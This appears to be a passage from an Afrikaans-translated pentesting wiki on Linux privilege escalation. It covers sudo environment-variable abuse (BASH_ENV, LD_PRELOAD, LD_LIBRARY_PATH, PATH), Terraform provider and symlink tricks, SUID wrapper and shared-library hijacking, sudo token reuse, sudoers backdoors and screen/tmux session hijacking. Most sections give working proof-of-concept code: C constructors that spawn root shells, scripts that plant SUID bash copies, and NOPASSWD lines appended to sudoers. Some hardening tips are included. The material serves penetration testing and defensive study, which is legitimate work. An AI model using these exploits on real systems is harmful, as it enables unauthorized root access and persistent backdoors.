- Dit is veral nuttig wanneer die bronlêer root-besit is en nie skryfbaar is nie, maar die insluitende `__pycache__`-gids wel skryfbaar is.
- `PYTHONDONTWRITEBYTECODE=1` en `python -B` keer dat Python nuwe `.pyc`-lêers skryf; dit keer **nie** dat dit ’n reeds geldige, deur ’n aanvaller vervangde cache laai nie. Die kritieke grens is of ’n gebruiker met laer regte ’n cache kan vervang wat die bevoorregte import sal aanvaar. Python gaan die tydstempel-/grootte- of hash-metadata na voordat dit die gekaste bytecode laai. Sien die [Python-importverwysing](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) en [opdragreëldokumentasie](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimale bewys-van-konsep-vorm:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Verharding:

- Maak seker dat geen gids in die bevoorregte Python-invoerpad skryfbaar is vir gebruikers met lae voorregte nie, insluitend `__pycache__`.
- Oudit die eienaarskap en toestemmings van kasgidse, insluitend bestaande `.pyc`-lêers. Die deaktivering van bytecode-skryfwerk kan die skep van nuwe kaslêers verminder, maar maak nie ’n vervangbare bestaande kaslêer onskadelik nie.
- Behandel skryfbare plaaslike Python-modules en skryfbare kasgidse net soos skryfbare shell-skrifte of gedeelde biblioteke wat as root uitgevoer word.

### BASH_ENV behou via sudo env_keep → root-shell

As sudoers `BASH_ENV` behou (bv. `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se gedrag tydens nie-interaktiewe aanvang benut om arbitrêre kode as root uit te voer wanneer jy ’n toegelate opdrag uitvoer.<sup>[[24]](#references)</sup>

- Waarom dit werk: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en laai daardie lêer in voordat die teikenskrip uitgevoer word. Baie sudo-reëls laat toe dat ’n skrip of ’n shell-omslag uitgevoer word. As sudo `BASH_ENV` behou, word jou lêer met root-voorregte gelaai.<sup>[[23]](#references)</sup>

- Vereistes:
  - ’n sudo-reël wat jy kan uitvoer (enige teiken wat `/bin/bash` nie-interaktief aanroep, of enige bash-skrip).
  - `BASH_ENV` moet in `env_keep` voorkom (kyk met `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Versterking:
  - Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`; verkies `env_reset`.
  - Vermy shell wrappers vir sudo-toegelate opdragte; gebruik minimale binaries.
  - Oorweeg sudo-I/O-logging en waarskuwings wanneer behoue omgewingsveranderlikes gebruik word.

### Terraform via sudo met behoue HOME (!env_reset)

Wanneer sudo Terraform as ’n gebruiker met meer voorregte toelaat, is `!env_reset` ’n leidraad om na te gaan watter omgewingsveranderlikes werklik deur daardie spesifieke reël behoue bly. Bevestig die effektiewe `HOME` of `TF_CLI_CONFIG_FILE` voordat jy aanvaar dat ’n `.terraformrc` of `terraform.rc` wat deur die oproeper geskryf kan word, die aktiewe CLI-konfigurasie is. ’n `provider_installation.dev_overrides`-inskrywing is slegs van belang as die vaste Terraform-opdrag daardie provider laai en die oproeper sy uitvoerbare lêer in die gekose gids kan plaas.<sup>[[25]](#references)</sup>

- Wys die vereiste provider na ’n gids waarin geskryf kan word en plaas ’n kwaadwillige plugin met die provider se naam daarin (bv. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform sal die Go-inprop-handdruk misluk, maar voer die loonvrag as root uit voordat dit afgaan, en laat ’n SUID-dop agter.

### TF_VAR-oorrides + omseiling van symlink-validering

Terraform-veranderlikes kan via `TF_VAR_<name>`-omgewingsveranderlikes verskaf word as die spesifieke sudo-reël dit behou. ’n Bron-symlink-**lees** vereis ook ’n provider wat die skakel volg en die beskermde resultaat na ’n bestemming kopieer wat die oproeper kan lees. ’n Bestemmings-symlink-**skryf** vereis afsonderlik ’n bestemmingsinskrywing wat deur die oproeper beheer word, en ’n bevoorregte provider wat dit tydens skryf volg; ’n latere geskeduleerde taak is slegs een moontlike gevolg. Inspekteer die presiese sudo-toekenning, relevante `.tf`-lêers, geselekteerde CLI-konfigurasie en pad-eienaarskap met leesalleen-opdragte soos `sudo -l`, `stat` en `readlink` voordat jy enige van die roetes toets. Swak leksikale validerings soos `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` los nie symlinks op nie:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform volg die simboliese skakel en kopieer die werklike `/root/root.txt` na ’n bestemming wat deur ’n aanvaller gelees kan word. Dieselfde benadering kan gebruik word om na bevoorregte paaie te **skryf** deur vooraf simboliese skakels by bestemmings te skep (bv. deur die bestemmingpad van die provider binne `/etc/cron.d/` te laat wys).

### requiretty / !requiretty

Op sommige ouer verspreidings kan sudo met `requiretty` opgestel word, wat afdwing dat sudo slegs vanaf ’n interaktiewe TTY uitgevoer word. As `!requiretty` gestel is (of die opsie afwesig is), kan sudo vanuit nie-interaktiewe kontekste uitgevoer word, soos reverse shells, cron-take of skrifte.

```bash
Defaults !requiretty
```

Dit is nie op sigself ’n direkte kwesbaarheid nie, maar dit vergroot die situasies waarin sudo-reëls misbruik kan word sonder dat ’n volledige PTY nodig is.

### Sudo env_keep+=PATH / onveilige secure_path → PATH hijack

As `sudo -l` `env_keep+=PATH` wys, of ’n `secure_path` met inskrywings bevat waaroor ’n aanvaller skryfregte het (bv. `/home/<user>/bin`), kan ’n ongekwalifiseerde eksterne opdrag binne die sudo-toegelate teiken deur ’n ander opdrag met dieselfde naam oorskadu word.<sup>[[3]](#references)</sup> ’n Ontbrekende effektiewe `secure_path` verdien ook ondersoek **as** die opdrag se sudo-omgewing ’n `PATH` behou wat deur die oproeper beheer word; die afwesigheid daarvan bewys op sigself nie dat dit wel gebeur nie. Lees die toegelate script sonder om dit uit te voer, en verifieer dan die presiese RunAs- en argumentreël, die effektiewe opdragsoekpad, en ’n vroeër, skryfbare en deurkruisbare gids wat die opdragnaam bevat. Verifikasie, `NOEXEC`, shell-ingeboude opdragte en absolute opdragpaaie kan die uitkoms verander.

- Vereistes: ’n sudo-reël (dikwels `NOPASSWD`) wat ’n script/binêre lêer laat loop wat opdragte sonder absolute paaie aanroep (`free`, `df`, `ps`, ens.), en ’n skryfbare PATH-inskrywing wat eerste deursoek word.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Om sudo-uitvoering te gebruik om paaie te omseil
**Spring** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in die sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

As ’n **wildcard** gebruik word (\*), is dit selfs makliker:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-opdrag/SUID-binêr sonder opdragpad

As die **sudo-toestemming** aan ’n enkele opdrag gegee word **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH-veranderlike te verander

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Hierdie tegniek kan ook gebruik word as ’n **suid**-binêre lêer **’n ander opdrag uitvoer sonder om die pad daarna te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van ’n vreemde SUID-binêre lêer)**.

[Voorbeelde van payloads om uit te voer.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID-binêre lêer met opdragpad

As die **suid**-binêre lêer **’n ander opdrag uitvoer deur die pad te spesifiseer**, kan jy probeer om ’n **funksie uit te voer** wat vernoem is na die opdrag wat die suid-lêer aanroep.

Byvoorbeeld, as ’n suid-binêre lêer _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en uit te voer:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Dan, wanneer jy die SUID-binêre lêer aanroep, sal hierdie funksie uitgevoer word

### Pasgemaakte SUID-kopieer-wrappers

’n SUID-hulpprogram wat deur root besit word en bron- en bestemmingspaaie aanvaar, kan twee verskillende vertrouensgrense oorsteek. As dit ’n shell-opdrag uit een van die argumente opbou (byvoorbeeld deur ’n saamgestelde `cp`-opdrag aan `system()` deur te gee), kan shell-metakarakters ’n ander opdrag met die effektiewe voorregte uitvoer. Selfs as dit `cp` veilig sonder ’n shell aanroep, kan ’n onbeperkte bestemming arbitrêre bevoorregte skryftoegang tot lêers soos `/etc/passwd` moontlik maak. Gaan die wrapper se argumenthantering, gedrag van die effektiewe UID, bestemmingsbeperkings en of die gekopieerde lêer die gebruiker se inhoud behou, na; ’n algemene `cp`-fout of die SUID-bis alleen bewys nie dat een van die paaie moontlik is nie. Lys die binêre lêer en sy toestemmings passief op voordat jy enige handmatige toetsing doen.

### Skryfbare script wat deur ’n SUID-wrapper uitgevoer word

’n Algemene verkeerde opstelling in ’n pasgemaakte toepassing is ’n SUID-binêre wrapper wat deur root besit word en ’n script uitvoer, terwyl die script self skryfbaar is vir gebruikers met lae voorregte.

Tipiese patroon:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

As `/usr/local/bin/backup.sh` skryfbaar is, kan jy payload-opdragte byvoeg en dan die SUID-wrapper uitvoer:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Vinnige kontroles:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Hierdie aanvalspad kom veral voor in "maintenance"/"backup"-wrappers wat in `/usr/local/bin` gelewer word.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die omgewingsveranderlike **LD_PRELOAD** word gebruik om een of meer gedeelde biblioteke (.so-lêers) te spesifiseer wat deur die loader gelaai moet word voordat enige ander biblioteke, insluitend die standaard C-biblioteek (`libc.so`). Hierdie proses staan bekend as die vooraflaai van ’n biblioteek.

Om stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid**-uitvoerbare lêers, dwing die stelsel egter sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie met die effektiewe gebruikers-ID (_euid_) ooreenstem nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat self ook suid/sgid is, vooraf gelaai.

Voorregte-eskalasie kan plaasvind as jy opdragte met `sudo` kan uitvoer en die uitvoer van `sudo -l` die stelling **env_keep+=LD_PRELOAD** bevat. Hierdie konfigurasie laat die omgewingsveranderlike **LD_PRELOAD** behoue bly en herken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van arbitrêre kode met verhoogde voorregte.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Stoor as **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Dan **kompileer dit** met:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Laastens, **eskaleer voorregte** deur dit te laat loop.

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> ’n Soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH**-omgewingsveranderlike beheer, omdat hy die pad beheer waar libraries gesoek sal word.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Wanneer jy op 'n binary met **SUID**-toestemmings afkom wat ongewoon lyk, is dit goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Byvoorbeeld, as jy ’n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ teëkom, dui dit op ’n moontlike uitbuitingsgeleentheid.

Om dit uit te buit, skep jy ’n C-lêer, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Hierdie kode poog, sodra dit saamgestel en uitgevoer is, om voorregte te verhoog deur lêertoestemmings te manipuleer en ’n shell met verhoogde voorregte uit te voer.

Stel die bogenoemde C-lêer saam tot ’n shared object (.so)-lêer met:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Uiteindelik behoort die uitvoering van die geraakte SUID-binêre die exploit te aktiveer, wat moontlike stelselkompromittering kan veroorsaak.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Noudat ons ’n SUID-binary gevind het wat ’n library laai vanaf ’n vouer waarin ons kan skryf, kom ons skep die library in daardie vouer met die nodige naam:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

As jy ’n fout kry soos

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

dit beteken dat die library wat jy gegenereer het, ’n funksie genaamd `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is ’n saamgestelde lys Unix-binaries wat ’n aanvaller kan uitbuit om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente kan inject** in ’n command.

Die projek versamel legitieme funksies van Unix-binaries wat misbruik kan word om uit beperkte shells te ontsnap, verhoogde privileges te eskaleer of te behou, lêers oor te dra, bind- en reverse shells te spawn, en ander post-exploitation-take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit ’n manier vind om enige sudo-reël uit te buit.

### Hergebruik van Sudo Tokens

In gevalle waar jy **sudo-toegang** het, maar nie die wagwoord nie, kan jy privileges eskaleer deur **te wag totdat ’n sudo-command uitgevoer word en dan die sessietoken te kaap**.<sup>[[18]](#references)</sup>

Vereistes om privileges te eskaleer:

- Jy het reeds ’n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets uit te voer in die **laaste 15 minute** (by verstek is dit die geldigheidsduur van die sudo-token, wat ons toelaat om `sudo` te gebruik sonder om ’n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is toeganklik (jy moet dit kan oplaai)

(Jy kan `ptrace_scope` tydelik aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, of dit permanent verander deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` in te stel.)

As aan al hierdie vereistes voldoen word, **kan jy privileges eskaleer met:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **eerste exploit** (`exploit.sh`) skep die binary `activate_sudo_token` in _/tmp_. Jy kan dit gebruik om **die sudo-token in jou sessie te aktiveer** (jy sal nie outomaties ’n root-shell kry nie; voer `sudo su` uit):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Die **tweede exploit** (`exploit_v2.sh`) sal ’n sh-shell in _/tmp_ skep wat **deur root besit word en setuid het**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- Die **derde exploit** (`exploit_v3.sh`) sal **'n sudoers-lêer skep** wat **sudo-tokens permanent maak en alle gebruikers toelaat om sudo te gebruik**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

As jy **skryfregte** in die vouer of op enige van die geskepte lêers daarin het, kan jy die binêre lêer [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **’n sudo-token vir ’n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy ’n shell as daardie gebruiker met PID 1234 het, kan jy **sudo-voorregte verkry** sonder om die wagwoord te ken deur:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel in wie `sudo` kan gebruik en hoe. Hierdie lêers **kan by verstek slegs deur die gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer kan **lees**, kan jy dalk **interessante inligting bekom**, en as jy enige lêer kan **skryf**, sal jy in staat wees om **escalate privileges**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

As jy kan skryf, kan jy hierdie toestemming misbruik.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Nog 'n manier om hierdie toestemmings te misbruik:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Daar is alternatiewe vir die `sudo`-binêre, soos `doas` vir OpenBSD. Onthou om die konfigurasie daarvan by `/etc/doas.conf` na te gaan.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

As `doas` ’n editor of interpreter toelaat, kyk vir GTFOBins-styl escapes:

```bash
doas vim
:!/bin/sh
```

A `doas`-reël wat root-toegang toelaat vir die oorspronklike Python-gebaseerde `dstat` verdien ook ’n hersiening van die plugin-pad. Die [handleiding](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) en [bron](https://github.com/dstat-real/dstat/blob/master/dstat) lys `/usr/share/dstat/` en `/usr/local/share/dstat/` as liggings vir `dstat_*.py`-plugins. As die huidige gebruiker na ’n ligging kan skryf én soek wat deur die geïnstalleerde bouweergawe gebruik word, kan ’n gekose plugin met die `doas` RunAs-identiteit loop. Bevestig die effektiewe reël, plugin-opsoekgedrag in daardie bouweergawe, die toestemmings of ACL’s van die gids en ouergidse, en of die oproeper ’n plugin kan kies; ’n `dstat`-reël of skryfbare gids alleen is bloot ’n leidraad. Ander `dstat`-implementerings kan verskillende pluginstelsels gebruik. Inspekteer metadata passief sonder om ’n plugin te laai.

### Sudo Hijacking

As jy weet dat ’n **gebruiker gewoonlik aan ’n masjien koppel en `sudo` gebruik** om voorregte te verhoog, en jy het ’n shell binne daardie gebruiker se konteks gekry, kan jy **’n nuwe sudo-uitvoerbare lêer skep** wat jou kode as root en daarna die gebruiker se opdrag sal uitvoer. **Verander dan die `$PATH`** in die gebruiker se konteks (byvoorbeeld deur die nuwe pad by `.bash_profile` te voeg), sodat jou sudo-uitvoerbare lêer loop wanneer die gebruiker sudo uitvoer.

Let daarop dat as die gebruiker ’n ander shell as bash gebruik, jy ander lêers sal moet verander om die nuwe pad by te voeg. Byvoorbeeld, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) verander `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog ’n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende uit te voer:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Gedeelde biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Hierdie lêer bevat gewoonlik die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers in `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waarin **biblioteke** **gesoek** sal word. Die inhoud van `/etc/ld.so.conf.d/libc.conf` is byvoorbeeld `/usr/local/lib`. **Dit beteken dat die stelsel binne `/usr/local/lib` na biblioteke sal soek**.

As ’n **gebruiker om een of ander rede skryftoestemmings** het vir enige van die aangeduide paaie — `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer waarna die konfigurasielêer binne `/etc/ld.so.conf.d/*.conf` verwys — kan die gebruiker moontlik voorregte eskaleer.\
Kyk na **hoe om hierdie verkeerde konfigurasie uit te buit** op die volgende bladsy:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word, soos gespesifiseer in die `RPATH`-veranderlike.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Skep dan ’n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities gee **’n subset van die beskikbare root-voorregte aan ’n proses**. Dit verdeel root-**voorregte effektief in kleiner, afsonderlike eenhede**. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volledige stel voorregte verminder, wat die risiko’s van uitbuiting verlaag.\
Lees die volgende bladsy om **meer oor capabilities te leer en te sien hoe om dit te misbruik**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Gidsregte

In ’n gids beteken die **"execute"-bis** dat die betrokke gebruiker die gids kan binnegaan met "**cd**".\
Die **"read"-bis** beteken dat die gebruiker die **lêers** kan lys, en die **"write"-bis** beteken dat die gebruiker nuwe **lêers** kan skep en bestaande lêers kan uitvee.

## ACLs

Toegangsbeheerlyste (ACLs) verteenwoordig die sekondêre laag van diskresionêre regte, wat **die tradisionele ugo/rwx-regte kan ignoreer**. Hierdie regte verbeter beheer oor toegang tot lêers of gidse deur regte toe te staan of te weier aan spesifieke gebruikers wat nie die eienaars is of deel van die groep is nie. Hierdie vlak van **fyn beheer verseker meer presiese toegangsbestuur**. Verdere besonderhede kan [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux) gevind word.<sup>[[19]](#references)</sup>

**Gee** gebruiker "kali" lees- en skryftoestemming vir ’n lêer:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Kry** lêers met spesifieke ACL's vanaf die stelsel:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Versteekte ACL backdoor in sudoers drop-ins

’n Algemene verkeerde konfigurasie is ’n lêer in `/etc/sudoers.d/` wat deur root besit word en modus `440` het, maar steeds skryftoegang via ACL aan ’n gebruiker met lae voorregte verleen.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

As jy iets soos `user:alice:rw-` sien, kan die gebruiker 'n sudo-reël byvoeg ondanks beperkende modusbits:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Dit is ’n ACL-persistensie-/privesc-pad met groot impak omdat dit maklik misgekyk word tydens resensies wat net `ls -l` gebruik.

## Oop dop-sessies

Toegang tot GNU Screen-sessies tussen gebruikers hang af van die **lopende sessie se konfigurasie en ACL**, nie net van die weergawe nie. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) dat dit met multiuser-ondersteuning gebou moet word; `multiuser on` en ’n `acladd`-toekenning of geskikte `aclchg`-toekenning laat ’n ander gebruiker toe om aan te sluit. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) vir die opsoek van sessies tussen gebruikers. ’n Sigbare sokkel wat deur root besit word, of ’n SUID-`screen`-binêre lêer op sigself, bewys nie dat ’n root-dop beskikbaar is om aan te sluit nie. Bevestig dat die aktiewe sessie multiuser is, dat die huidige gebruiker effektiewe invoer-/opdragtoestemming het, en dat die dop in daardie sessie as die bevoorregte eienaar loop voordat jy dit as ’n eskalasie beskou.

### Kaping van screen-sessies

**Lys screen-sessies**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Kaping van screen-sessies - Sok-liggings (sommige stelsels stel die een as 'n simboliese skakel na die ander bloot): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Koppel aan 'n sessie**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux-sessies hijacking

Dit was ’n probleem met **ou tmux-weergawes**. As ’n gebruiker sonder spesiale voorregte kon ek nie ’n tmux-sessie (v2.1) wat deur root geskep is, hijack nie.

**Lys tmux-sessies**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket-liggings (sommige stelsels stel een as ’n simboliese skakel na die ander bloot) - tmux-sessies kaping: tmux -S /tmp/dev sess ls Lys met daardie socket; jy kan ’n tmux-sessie op daardie socket begin...](<../../images/image (837).png>)

**Koppel aan ’n sessie**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

